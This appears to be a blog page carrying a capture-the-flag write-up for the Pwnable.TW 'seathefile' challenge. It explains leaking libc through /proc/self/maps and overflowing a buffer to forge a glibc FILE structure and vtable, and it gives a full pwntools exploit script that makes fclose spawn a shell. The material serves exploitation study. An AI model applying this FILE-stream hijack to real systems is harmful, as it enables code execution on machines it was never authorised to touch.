@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+  
+
+
+
+  
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="FILE stream oriented programming">
+  <meta name="keywords" content="Programming, PHP, and Ruby">
+  <meta name="author" content="&#91;Pwnable.TW&#93; seathefile | Leonids">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#f5f5f5">
+
+  <!-- Twitter Tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="&#91;Pwnable.TW&#93; seathefile | Leonids">
+  <meta name="twitter:description" content="FILE stream oriented programming">
+  <meta name="twitter:image" content="https://WenYang-Lai.github.io//img/leonids-logo.png">
+
+  <!-- Open Graph Tags -->
+  <meta property="og:type" content="blog">
+  <meta property="og:url" content="https://WenYang-Lai.github.io/">
+  <meta property="og:title" content="&#91;Pwnable.TW&#93; seathefile | Leonids">
+  <meta property="og:description" content="FILE stream oriented programming">
+  <meta property="og:image" content="https://WenYang-Lai.github.io//img/leonids-logo.png">
+  <title>&#91;Pwnable.TW&#93; seathefile | Leonids</title>
+
+  <!-- CSS files -->
+  <link rel="stylesheet" href="https://WenYang-Lai.github.io//css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://WenYang-Lai.github.io//css/main.css">
+
+  <link rel="canonical" href="https://WenYang-Lai.github.io//articles/2018-08/%5BPwnableTW%5D-seathefile">
+  <link rel="alternate" type="application/rss+xml" title="Leonids" href="https://WenYang-Lai.github.io/ /feed.xml " />
+
+  <!-- Icons -->
+  <!-- 16x16 -->
+  <link rel="shortcut icon" href="https://WenYang-Lai.github.io//favicon.ico">
+  <!-- 32x32 -->
+  <link rel="shortcut icon" href="https://WenYang-Lai.github.io//favicon.png">
+</head>
+
+
+<body>
+  <div class="row">
+    <div class="col s12 m2">
+      <div class="table cover">
+         
+
+<div class="cover-card table-cell table-middle">
+  
+  <img src="https://WenYang-Lai.github.io//img/avatar.jpg" alt="" class="avatar">
+  
+  <a href="https://WenYang-Lai.github.io//" class="author_name">pandaft</a>
+  <span class="author_job">Graduate Student & Pwner</span>
+  <span class="author_bio mbm">A graduate student at NCTU</span>
+  <nav class="nav">
+    <ul class="nav-list">
+      <li class="nav-item">
+        <a href="https://WenYang-Lai.github.io//">home</a>
+        <span>/</span>
+      </li>
+       
+      <li class="nav-item">
+        <a href="https://WenYang-Lai.github.io//archive/">Archive</a>
+        
+          <span>/</span>
+        
+      </li>
+          
+      <li class="nav-item">
+        <a href="https://WenYang-Lai.github.io//categories/">Categories</a>
+        
+          <span>/</span>
+        
+      </li>
+            
+      <li class="nav-item">
+        <a href="https://WenYang-Lai.github.io//resume/">Resume</a>
+        
+      </li>
+       
+    </ul>
+  </nav>
+  <script type="text/javascript">
+  // based on http://stackoverflow.com/a/10300743/280842
+  function gen_mail_to_link(hs, subject) {
+    var lhs,rhs;
+    var p = hs.split('@');
+    lhs = p[0];
+    rhs = p[1];
+    document.write("<a class=\"social-link-item\" target=\"_blank\" href=\"mailto");
+    document.write(":" + lhs + "@");
+    document.write(rhs + "?subject=" + subject + "\"><i class=\"fa fa-fw fa-envelope\"></i><\/a>");
+  }
+</script>
+<div class="social-links">
+  <ul>
+    
+      <li>
+      <script>gen_mail_to_link('x3639026@gmail.com', 'Hello from website');</script>
+      </li>
+    
+    
+    <li><a href="http://facebook.com/100000212816902" class="social-link-item" target="_blank"><i class="fa fa-fw fa-facebook"></i></a></li>
+    
+    
+    
+    <li><a href="http://instagram.com/wenyanglai" class="social-link-item" target="_blank"><i class="fa fa-fw fa-instagram"></i></a></li>
+    
+    <li><a href="http://github.com/WenYang-Lai" class="social-link-item" target="_blank"><i class="fa fa-fw fa-github"></i></a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  </ul>
+</div>
+
+</div>
+
+      </div>
+    </div>
+    <div class="col s12 m8">
+      <div class="post-listing">
+        <a class="btn" href= "https://WenYang-Lai.github.io//" >
+  Home
+</a>
+
+
+
+<div id="post">
+  <header class="post-header">
+    <h1 title="&#91;Pwnable.TW&#93; seathefile">&#91;Pwnable.TW&#93; seathefile</h1>
+    <span class="post-meta">
+      <span class="post-date">
+        4 AUG 2018
+      </span>
+      •
+      <span class="read-time" title="Estimated read time">
+  
+  
+    4 mins read
+  
+</span>
+
+    </span>
+
+  </header>
+
+  <article class="post-content">
+    
+<p>Arch:   i386-32-little
+RELRO:  Partial RELRO
+Stack   No canary found
+NX:     NX enabled
+PIE:    No PIE</p>
+
+<p>We have 4 option, <code>openfile()</code>, <code>readfile()</code>, <code>writefile()</code>, so we can leak vmmap by open <code>/proc/self/maps</code></p>
+
+<p>Moreover, there is a buffer overflow vulnerability in option 5
+We can overwrite the fp pointer trigger _IO_FINISH(fp) in <code>fclose()</code> routine</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">_IO_new_fclose</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">status</span><span class="p">;</span>
+
+  <span class="n">CHECK_FILE</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">_IO_old_fclose</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
+    <span class="n">_IO_un_link</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>
+
+  <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
+    <span class="n">status</span> <span class="o">=</span> <span class="n">_IO_file_close_it</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="k">else</span>
+    <span class="n">status</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_ERR_SEEN</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+  <span class="n">_IO_FINISH</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+	<span class="p">...</span>
+<span class="p">}</span></code></pre></div>
+
+<p>Then we look at the FILE structure, make a fake FILE chunk and vtable.</p>
+
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+<span class="cp">#define _IO_file_flags _flags
+</span>
+  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>
+  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>
+
+	
+  <span class="p">...</span>
+  <span class="p">...</span>
+
+<span class="p">};</span>
+
+
+<span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="p">{</span>
+	<span class="kt">FILE</span> <span class="n">file</span><span class="p">;</span>
+	<span class="k">const</span> <span class="k">struct</span> <span class="n">IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p>make flag as <code>\xff\xff\xff\xff;/bin/sh</code>, it will ignore unexecutable command before <code>;</code> and launch shell.</p>
+
+<h3 id="exploitpy">exploit.py</h3>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c">#context.log_level = 'debug'</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s">'chall.pwnable.tw'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">10200</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./q'</span><span class="p">)</span><span class="c">#, env={'LD_PRELOAD': './libc_32.so.6'})</span>
+
+
+<span class="k">def</span> <span class="nf">openfile</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">readfile</span><span class="p">():</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">writetoscreen</span><span class="p">():</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">closefile</span><span class="p">():</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leave</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'5'</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc_32.so.6'</span><span class="p">)</span>
+
+<span class="n">openfile</span><span class="p">(</span><span class="s">'/proc/self/maps'</span><span class="p">)</span>
+<span class="n">readfile</span><span class="p">()</span>
+<span class="n">writetoscreen</span><span class="p">()</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x1000</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'libc:'</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+
+<span class="n">fake_file</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xff\xff\xff\xff</span><span class="s">;/bin/sh'</span>
+<span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x94</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b300</span><span class="o">+</span><span class="mh">0x98</span><span class="p">)</span>
+<span class="n">fake_file</span> <span class="o">+=</span> <span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">*</span><span class="mi">21</span><span class="p">)</span>
+
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b300</span><span class="p">))</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">fake_file</span>
+
+<span class="n">leave</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
+
+
+  </article>
+</div>
+
+<div class="share-buttons">
+  <h6>Share on: </h6>
+  <ul>
+    <li>
+      <a href="https://twitter.com/intent/tweet?text=https://WenYang-Lai.github.io//articles/2018-08/%5BPwnableTW%5D-seathefile" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
+    </li>
+    <li>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://WenYang-Lai.github.io//articles/2018-08/%5BPwnableTW%5D-seathefile" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
+    </li>
+    <li>
+      <a href="https://plus.google.com/share?url=https://WenYang-Lai.github.io//articles/2018-08/%5BPwnableTW%5D-seathefile" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
+    </li>
+    <li>
+      <a href="https://news.ycombinator.com/submitlink?u=https://WenYang-Lai.github.io//articles/2018-08/%5BPwnableTW%5D-seathefile" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
+    </li>
+    <li>
+      <a href="https://www.reddit.com/submit?url=https://WenYang-Lai.github.io//articles/2018-08/%5BPwnableTW%5D-seathefile" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
+    </li>
+  </ul>
+</div><!-- end share-buttons -->
+
+
+
+        <footer>
+  &copy; 2018 pandaft. Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://github.com/renyuanz/leonids/">leonids theme</a> made with <i class="fa fa-heart heart-icon"></i>
+</footer>
+
+      </div>
+    </div>
+  </div>
+  <script type="text/javascript" src="https://WenYang-Lai.github.io//js/jquery-3.2.1.min.js"></script>
+<script type="text/javascript" src="https://WenYang-Lai.github.io//js/main.js"></script>
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-62251910-2', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+</body>
+</html>
